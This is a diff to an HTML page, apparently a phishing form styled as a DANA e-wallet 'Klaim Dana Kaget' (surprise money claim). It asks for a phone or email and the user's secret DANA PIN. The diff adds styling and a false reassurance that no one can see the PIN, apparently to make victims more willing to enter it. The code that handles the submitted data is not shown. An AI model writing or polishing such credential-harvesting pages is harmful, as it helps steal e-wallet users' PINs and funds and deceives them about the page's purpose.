@@ -38,6 +38,14 @@
       border: 1px solid #ccc;
       border-radius: 4px;
     }
+    .note {
+      font-size: 12px;
+      font-style: italic;
+      color: #666;
+      margin-top: -8px;
+      margin-bottom: 10px;
+      text-align: left;
+    }
     button {
       width: 100%;
       padding: 10px;
@@ -63,6 +71,7 @@
   <h2>Klaim Dana Kaget</h2>
   <input type="text" id="email" placeholder="Email atau Nomor HP">
   <input type="password" id="password" placeholder="PIN DANA">
+  <div class="note">*PIN Anda tidak bisa dilihat siapapun</div>
   <button onclick="klaim()">Klaim Sekarang</button>
   <div class="msg" id="msg"></div>
 </div>
